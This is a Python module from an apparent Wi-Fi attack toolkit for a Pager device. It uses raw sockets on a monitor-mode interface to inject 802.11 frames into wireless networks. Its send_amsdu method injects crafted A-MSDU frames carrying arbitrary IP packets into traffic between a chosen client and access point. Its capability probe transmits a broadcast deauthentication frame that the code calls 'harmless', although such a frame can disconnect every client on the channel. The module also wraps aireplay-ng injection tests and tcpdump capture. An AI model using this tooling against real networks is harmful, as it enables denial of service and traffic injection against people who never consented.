#!/usr/bin/env python3
"""Raw 802.11 injection on the Pager's monitor interface.

Uses Linux AF_PACKET raw sockets -- the same mechanism aireplay-ng uses via
libpcap -- so no external packages are required. A radiotap-prefixed frame
written to a monitor-mode interface is transmitted by mac80211.

The capability probe is deliberately conservative: it never claims injection
works unless an on-air check (loopback capture or aireplay-ng test) confirms
it. Failures are reported, never hidden.
"""

from __future__ import annotations

import os
import re
import shutil
import socket
import struct
import subprocess
import time

from . import frames

ETH_P_ALL = 0x0003
DEFAULT_IFACE = os.environ.get("SHARD_IFACE", "wlan1mon")


class InjectionError(RuntimeError):
    pass


def interface_exists(iface):
    try:
        with open("/sys/class/net/%s/type" % iface) as fh:
            return int(fh.read().strip()) == 0  # ARPHRD_ETHER
    except Exception:
        return False


def interface_is_monitor(iface):
    """Best-effort check that the interface is in monitor mode via iw."""
    iw = shutil.which("iw")
    if not iw:
        return None
    try:
        out = subprocess.check_output([iw, "dev", iface, "info"],
                                      stderr=subprocess.DEVNULL, text=True,
                                      timeout=5)
    except Exception:
        return False
    return "type monitor" in out


def set_channel(iface, channel):
    """Lock a monitor interface to a channel. Returns (ok, message)."""
    iw = shutil.which("iw")
    if not iw:
        return False, "iw not installed"
    band = "2.4 GHz" if int(channel) <= 14 else "5 GHz"
    try:
        subprocess.check_call([iw, "dev", iface, "set", "channel", str(channel)],
                              stderr=subprocess.DEVNULL, timeout=8)
        return True, "locked %s to channel %s (%s)" % (iface, channel, band)
    except Exception as exc:
        return False, "channel %s failed: %s" % (channel, exc)


class Injector:
    """Thin wrapper around an AF_PACKET raw socket bound to a monitor iface."""

    def __init__(self, iface=DEFAULT_IFACE):
        self.iface = iface
        self.sock = None

    def __enter__(self):
        if not interface_exists(self.iface):
            raise InjectionError("interface %s does not exist" % self.iface)
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                                  socket.htons(ETH_P_ALL))
        try:
            self.sock.bind((self.iface, 0))
        except Exception as exc:
            self.sock.close()
            self.sock = None
            raise InjectionError("cannot bind %s: %s" % (self.iface, exc))
        return self

    def __exit__(self, *exc):
        if self.sock is not None:
            self.sock.close()
            self.sock = None
        return False

    def send(self, frame):
        if self.sock is None:
            raise InjectionError("injector not open")
        try:
            return self.sock.send(frame)
        except Exception as exc:
            raise InjectionError("send failed: %s" % exc)

    def send_amsdu(self, client_mac, ap_bssid, ip_packet, channel=None,
                   rate=0x02, seq=0):
        frame = frames.build_amsdu_injection(client_mac, ap_bssid, ip_packet,
                                              channel=channel, rate=rate, seq=seq)
        return self.send(frame)


def probe_raw(iface=DEFAULT_IFACE):
    """Probe raw-socket injection with a harmless broadcast deauth frame.

    Returns a dict describing what was actually verified. ``os_ok`` means the
    kernel accepted the frame for transmission; it does NOT guarantee the frame
    reached the air (only an on-air capture can prove that).
    """
    result = {"iface": iface, "exists": False, "monitor": None,
              "os_ok": False, "bytes": 0, "error": ""}
    result["exists"] = interface_exists(iface)
    if not result["exists"]:
        result["error"] = "interface %s not found" % iface
        return result
    result["monitor"] = interface_is_monitor(iface)
    try:
        frame = frames.build_radiotap() + frames.build_deauth(
            "ff:ff:ff:ff:ff:ff", "ff:ff:ff:ff:ff:ff", reason=7)
        with Injector(iface) as inj:
            result["bytes"] = inj.send(frame)
        result["os_ok"] = result["bytes"] == len(frame)
    except Exception as exc:
        result["error"] = str(exc)
    return result


def probe_aircrack(iface=DEFAULT_IFACE, timeout=12):
    """Run aireplay-ng's injection test if available.

    Returns (ok, detail). This is optional: many Pager firmware builds ship
    aireplay-ng but the test may be blocked by PineAP holding the interface.
    """
    aireplay = shutil.which("aireplay-ng")
    if not aireplay:
        return False, "aireplay-ng not installed"
    try:
        proc = subprocess.run(
            [aireplay, "--test", "--bittest", "-F", iface],
            capture_output=True, text=True, timeout=timeout)
        out = (proc.stdout or "") + (proc.stderr or "")
        if "Injection is working" in out or re.search(r"\b(?:[1-9]\d?/30|30/30)\b", out):
            return True, "aireplay-ng injection test passed"
        m = re.search(r"(\d+)/30", out)
        if m:
            return int(m.group(1)) > 0, "aireplay-ng %s/30" % m.group(1)
        return False, out.strip().splitlines()[-1] if out.strip() else "no output"
    except subprocess.TimeoutExpired:
        return False, "aireplay-ng test timed out"
    except Exception as exc:
        return False, str(exc)


def capture_response(iface=DEFAULT_IFACE, duration=4.0, bpf=None,
                     output=None):
    """Capture frames after injection using tcpdump, returning raw hex lines.

    ``bpf`` is an optional tcpdump filter expression. When ``output`` is given
    the capture is also written there as text.
    """
    tcpdump = shutil.which("tcpdump")
    if not tcpdump:
        return [], "tcpdump not installed"
    cmd = [tcpdump, "-i", iface, "-e", "-nn", "-xx", "-s", "256", "-l"]
    if bpf:
        cmd.append(bpf)
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True)
    except Exception as exc:
        return [], str(exc)
    lines = []
    deadline = time.time() + duration
    try:
        while time.time() < deadline:
            line = proc.stdout.readline()
            if not line:
                break
            lines.append(line.rstrip("\n"))
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()
    if output:
        try:
            with open(output, "w") as fh:
                fh.write("\n".join(lines))
        except Exception:
            pass
    return lines, ""
